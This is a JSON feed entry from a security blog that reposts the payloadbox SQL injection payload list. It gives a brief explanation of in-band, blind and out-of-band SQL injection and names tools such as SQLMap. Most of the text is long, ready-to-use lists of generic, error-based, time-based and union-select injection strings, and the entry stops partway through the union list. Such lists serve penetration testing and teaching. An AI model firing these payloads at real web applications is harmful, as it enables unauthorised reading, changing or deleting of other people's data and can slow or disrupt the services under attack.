{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"sql注入\" tag",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/",
            "title": "SQL-injection-payload-list【转】",
            "date_published": "2020-12-30T09:38:30.000Z",
            "content_html": "<h1 id=\"sql-injection-payload-list\"><a class=\"anchor\" href=\"#sql-injection-payload-list\">#</a> SQL Injection Payload List</h1>\n<p>源地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvc3FsLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=\">https://github.com/payloadbox/sql-injection-payload-list</span></p>\n<h2 id=\"sql-injection\"><a class=\"anchor\" href=\"#sql-injection\">#</a> SQL Injection</h2>\n<p>In this section, we'll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.</p>\n<h2 id=\"what-is-sql-injection-sqli\"><a class=\"anchor\" href=\"#what-is-sql-injection-sqli\">#</a> What is SQL injection (SQLi)?</h2>\n<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.</p>\n<p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>\n<table>\n<thead>\n<tr>\n<th>SQL Injection Type</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>In-band SQLi (Classic SQLi)</td>\n<td>In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi.</td>\n</tr>\n<tr>\n<td>Error-based SQLi</td>\n<td>Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.</td>\n</tr>\n<tr>\n<td>Union-based SQLi</td>\n<td>Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.</td>\n</tr>\n<tr>\n<td>Inferential SQLi (Blind SQLi)</td>\n<td>Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.</td>\n</tr>\n<tr>\n<td>Boolean-based (content-based) Blind SQLi</td>\n<td>Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>\n</tr>\n<tr>\n<td>Time-based Blind SQLi</td>\n<td>Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. epending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>\n</tr>\n<tr>\n<td>Out-of-band SQLi</td>\n<td>Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).</td>\n</tr>\n<tr>\n<td>Voice Based Sql Injection</td>\n<td>It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound.</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"sql-injection-vulnerability-scanner-tools\"><a class=\"anchor\" href=\"#sql-injection-vulnerability-scanner-tools\">#</a> SQL Injection Vulnerability Scanner Tool's :</h2>\n<ul>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">SQLMap</span> – Automatic SQL Injection And Database Takeover Tool</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JvbjE5MC9qc3FsLWluamVjdGlvbg==\">jSQL Injection</span> – Java Tool For Automatic SQL Database Injection</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05lb2hhcHNpcy9iYnFzcWw=\">BBQSQL</span> – A Blind SQL-Injection Exploitation Tool</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvZGluZ28vTm9TUUxNYXA=\">NoSQLMap</span> – Automated NoSQL Database Pwnage</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2l0cGxvaXQuY29tLzIwMTcvMDUvd2hpdGV3aWRvdy1zcWwtdnVsbmVyYWJpbGl0eS1zY2FubmVyLmh0bWw=\">Whitewidow</span> – SQL Vulnerability Scanner</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtL0RTU1M=\">DSSS</span> – Damn Small SQLi Scanner</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R0YWctZGV2LXNlYy9leHBsbw==\">explo</span> – Human And Machine Readable Web Vulnerability Testing Format</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F3bnVtYXIvYmxpbmQtc3FsLWJpdHNoaWZ0aW5n\">Blind-Sql-Bitshifting</span> – Blind SQL-Injection via Bitshifting</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xldmlhdGhhbi1mcmFtZXdvcmsvbGV2aWF0aGFu\">Leviathan</span> – Wide Range Mass Audit Toolkit</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pvaG5Ucm9vbnkvQmxpc3F5\">Blisqy</span> – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)</p>\n</li>\n</ul>\n<h2 id=\"generic-sql-injection-payloads\"><a class=\"anchor\" href=\"#generic-sql-injection-payloads\">#</a> Generic SQL Injection Payloads</h2>\n<pre><code>'\n''\n`\n``\n,\n&quot;\n&quot;&quot;\n/\n//\n\\\n\\\\\n;\n' or &quot;\n-- or # \n' OR '1\n' OR 1 -- -\n&quot; OR &quot;&quot; = &quot;\n&quot; OR 1 = 1 -- -\n' OR '' = '\n'='\n'LIKE'\n'=0--+\n OR 1=1\n' OR 'x'='x\n' AND id IS NULL; --\n'''''''''''''UNION SELECT '2\n%00\n/*…*/ \n+\t\taddition, concatenate (or space in url)\n||\t\t(double pipe) concatenate\n%\t\twildcard attribute indicator\n\n@variable\tlocal variable\n@@variable\tglobal variable\n\n\n# Numeric\nAND 1\nAND 0\nAND true\nAND false\n1-false\n1-true\n1*56\n-2\n\n\n1' ORDER BY 1--+\n1' ORDER BY 2--+\n1' ORDER BY 3--+\n\n1' ORDER BY 1,2--+\n1' ORDER BY 1,2,3--+\n\n1' GROUP BY 1,2,--+\n1' GROUP BY 1,2,3--+\n' GROUP BY columnnames having 1=1 --\n\n\n-1' UNION SELECT 1,2,3--+\n' UNION SELECT sum(columnname ) from tablename --\n\n\n-1 UNION SELECT 1 INTO @,@\n-1 UNION SELECT 1 INTO @,@,@\n\n1 AND (SELECT * FROM Users) = 1\t\n\n' AND MID(VERSION(),1,1) = '5';\n\n' and 1 in (select min(name) from sysobjects where xtype = 'U' and name &gt; '.') --\n\n\nFinding the table name\n\n\nTime-Based:\n,(select * from (select(sleep(10)))a)\n%2c(select%20*%20from%20(select(sleep(10)))a)\n';WAITFOR DELAY '0:0:30'--\n\nComments:\n\n#\t    Hash comment\n/*  \tC-style comment\n-- -\tSQL comment\n;%00\tNullbyte\n`\t    Backtick\n</code></pre>\n<h2 id=\"generic-error-based-payloads\"><a class=\"anchor\" href=\"#generic-error-based-payloads\">#</a> Generic Error Based Payloads</h2>\n<pre><code> OR 1=1\n OR 1=0\n OR x=x\n OR x=y\n OR 1=1#\n OR 1=0#\n OR x=x#\n OR x=y#\n OR 1=1-- \n OR 1=0-- \n OR x=x-- \n OR x=y-- \n OR 3409=3409 AND ('pytW' LIKE 'pytW\n OR 3409=3409 AND ('pytW' LIKE 'pytY\n HAVING 1=1\n HAVING 1=0\n HAVING 1=1#\n HAVING 1=0#\n HAVING 1=1-- \n HAVING 1=0-- \n AND 1=1\n AND 1=0\n AND 1=1-- \n AND 1=0-- \n AND 1=1#\n AND 1=0#\n AND 1=1 AND '%'='\n AND 1=0 AND '%'='\n AND 1083=1083 AND (1427=1427\n AND 7506=9091 AND (5913=5913\n AND 1083=1083 AND ('1427=1427\n AND 7506=9091 AND ('5913=5913\n AND 7300=7300 AND 'pKlZ'='pKlZ\n AND 7300=7300 AND 'pKlZ'='pKlY\n AND 7300=7300 AND ('pKlZ'='pKlZ\n AND 7300=7300 AND ('pKlZ'='pKlY\n AS INJECTX WHERE 1=1 AND 1=1\n AS INJECTX WHERE 1=1 AND 1=0\n AS INJECTX WHERE 1=1 AND 1=1#\n AS INJECTX WHERE 1=1 AND 1=0#\n AS INJECTX WHERE 1=1 AND 1=1--\n AS INJECTX WHERE 1=1 AND 1=0--\n WHERE 1=1 AND 1=1\n WHERE 1=1 AND 1=0\n WHERE 1=1 AND 1=1#\n WHERE 1=1 AND 1=0#\n WHERE 1=1 AND 1=1--\n WHERE 1=1 AND 1=0--\n ORDER BY 1-- \n ORDER BY 2-- \n ORDER BY 3-- \n ORDER BY 4-- \n ORDER BY 5-- \n ORDER BY 6-- \n ORDER BY 7-- \n ORDER BY 8-- \n ORDER BY 9-- \n ORDER BY 10-- \n ORDER BY 11-- \n ORDER BY 12-- \n ORDER BY 13-- \n ORDER BY 14-- \n ORDER BY 15-- \n ORDER BY 16-- \n ORDER BY 17-- \n ORDER BY 18-- \n ORDER BY 19-- \n ORDER BY 20-- \n ORDER BY 21-- \n ORDER BY 22-- \n ORDER BY 23-- \n ORDER BY 24-- \n ORDER BY 25-- \n ORDER BY 26-- \n ORDER BY 27-- \n ORDER BY 28-- \n ORDER BY 29-- \n ORDER BY 30-- \n ORDER BY 31337-- \n ORDER BY 1# \n ORDER BY 2# \n ORDER BY 3# \n ORDER BY 4# \n ORDER BY 5# \n ORDER BY 6# \n ORDER BY 7# \n ORDER BY 8# \n ORDER BY 9# \n ORDER BY 10# \n ORDER BY 11# \n ORDER BY 12# \n ORDER BY 13# \n ORDER BY 14# \n ORDER BY 15# \n ORDER BY 16# \n ORDER BY 17# \n ORDER BY 18# \n ORDER BY 19# \n ORDER BY 20# \n ORDER BY 21# \n ORDER BY 22# \n ORDER BY 23# \n ORDER BY 24# \n ORDER BY 25# \n ORDER BY 26# \n ORDER BY 27# \n ORDER BY 28# \n ORDER BY 29# \n ORDER BY 30#\n ORDER BY 31337#\n ORDER BY 1 \n ORDER BY 2 \n ORDER BY 3 \n ORDER BY 4 \n ORDER BY 5 \n ORDER BY 6 \n ORDER BY 7 \n ORDER BY 8 \n ORDER BY 9 \n ORDER BY 10 \n ORDER BY 11 \n ORDER BY 12 \n ORDER BY 13 \n ORDER BY 14 \n ORDER BY 15 \n ORDER BY 16 \n ORDER BY 17 \n ORDER BY 18 \n ORDER BY 19 \n ORDER BY 20 \n ORDER BY 21 \n ORDER BY 22 \n ORDER BY 23 \n ORDER BY 24 \n ORDER BY 25 \n ORDER BY 26 \n ORDER BY 27 \n ORDER BY 28 \n ORDER BY 29 \n ORDER BY 30 \n ORDER BY 31337 \n RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\n RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\nIF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\nIF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\n%' AND 8310=8310 AND '%'='\n%' AND 8310=8311 AND '%'='\n and (select substring(@@version,1,1))='X'\n and (select substring(@@version,1,1))='M'\n and (select substring(@@version,2,1))='i'\n and (select substring(@@version,2,1))='y'\n and (select substring(@@version,3,1))='c'\n and (select substring(@@version,3,1))='S'\n and (select substring(@@version,3,1))='X'\n</code></pre>\n<h2 id=\"generic-time-based-sql-injection-payloads\"><a class=\"anchor\" href=\"#generic-time-based-sql-injection-payloads\">#</a> Generic Time Based SQL Injection Payloads</h2>\n<pre><code># from wapiti\nsleep(5)#\n1 or sleep(5)#\n&quot; or sleep(5)#\n' or sleep(5)#\n&quot; or sleep(5)=&quot;\n' or sleep(5)='\n1) or sleep(5)#\n&quot;) or sleep(5)=&quot;\n') or sleep(5)='\n1)) or sleep(5)#\n&quot;)) or sleep(5)=&quot;\n')) or sleep(5)='\n;waitfor delay '0:0:5'--\n);waitfor delay '0:0:5'--\n';waitfor delay '0:0:5'--\n&quot;;waitfor delay '0:0:5'--\n');waitfor delay '0:0:5'--\n&quot;);waitfor delay '0:0:5'--\n));waitfor delay '0:0:5'--\n'));waitfor delay '0:0:5'--\n&quot;));waitfor delay '0:0:5'--\nbenchmark(10000000,MD5(1))#\n1 or benchmark(10000000,MD5(1))#\n&quot; or benchmark(10000000,MD5(1))#\n' or benchmark(10000000,MD5(1))#\n1) or benchmark(10000000,MD5(1))#\n&quot;) or benchmark(10000000,MD5(1))#\n') or benchmark(10000000,MD5(1))#\n1)) or benchmark(10000000,MD5(1))#\n&quot;)) or benchmark(10000000,MD5(1))#\n')) or benchmark(10000000,MD5(1))#\npg_sleep(5)--\n1 or pg_sleep(5)--\n&quot; or pg_sleep(5)--\n' or pg_sleep(5)--\n1) or pg_sleep(5)--\n&quot;) or pg_sleep(5)--\n') or pg_sleep(5)--\n1)) or pg_sleep(5)--\n&quot;)) or pg_sleep(5)--\n')) or pg_sleep(5)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe\nAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#\nSLEEP(5)#\nSLEEP(5)--\nSLEEP(5)=&quot;\nSLEEP(5)='\nor SLEEP(5)\nor SLEEP(5)#\nor SLEEP(5)--\nor SLEEP(5)=&quot;\nor SLEEP(5)='\nwaitfor delay '00:00:05'\nwaitfor delay '00:00:05'--\nwaitfor delay '00:00:05'#\nbenchmark(50000000,MD5(1))\nbenchmark(50000000,MD5(1))--\nbenchmark(50000000,MD5(1))#\nor benchmark(50000000,MD5(1))\nor benchmark(50000000,MD5(1))--\nor benchmark(50000000,MD5(1))#\npg_SLEEP(5)\npg_SLEEP(5)--\npg_SLEEP(5)#\nor pg_SLEEP(5)\nor pg_SLEEP(5)--\nor pg_SLEEP(5)#\n'\\&quot;\nAnD SLEEP(5)\nAnD SLEEP(5)--\nAnD SLEEP(5)#\n&amp;&amp;SLEEP(5)\n&amp;&amp;SLEEP(5)--\n&amp;&amp;SLEEP(5)#\n' AnD SLEEP(5) ANd '1\n'&amp;&amp;SLEEP(5)&amp;&amp;'1\nORDER BY SLEEP(5)\nORDER BY SLEEP(5)--\nORDER BY SLEEP(5)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--\n+benchmark(3200,SHA1(1))+'\n+ SLEEP(10) + '\nRANDOMBLOB(500000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nRANDOMBLOB(1000000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nSLEEP(1)/*' or SLEEP(1) or '&quot; or SLEEP(1) or &quot;*/\n</code></pre>\n<h2 id=\"generic-union-select-payloads\"><a class=\"anchor\" href=\"#generic-union-select-payloads\">#</a> Generic Union Select Payloads</h2>\n<pre><code> ORDER BY SLEEP(5)\n ORDER BY 1,SLEEP(5)\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n ORDER BY SLEEP(5)#\n ORDER BY 1,SLEEP(5)#\n ORDER BY 1,SLEEP(5),3#\n ORDER BY 1,SLEEP(5),3,4#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n ORDER BY SLEEP(5)-- \n ORDER BY 1,SLEEP(5)-- \n ORDER BY 1,SLEEP(5),3-- \n ORDER BY 1,SLEEP(5),3,4-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION ALL SELECT 1\n UNION ALL SELECT 1,2\n UNION ALL SELECT 1,2,3\n UNION ALL SELECT 1,2,3,4\n UNION ALL SELECT 1,2,3,4,5\n UNION ALL SELECT 1,2,3,4,5,6\n UNION ALL SELECT 1,2,3,4,5,6,7\n UNION ALL SELECT 1,2,3,4,5,6,7,8\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION ALL SELECT 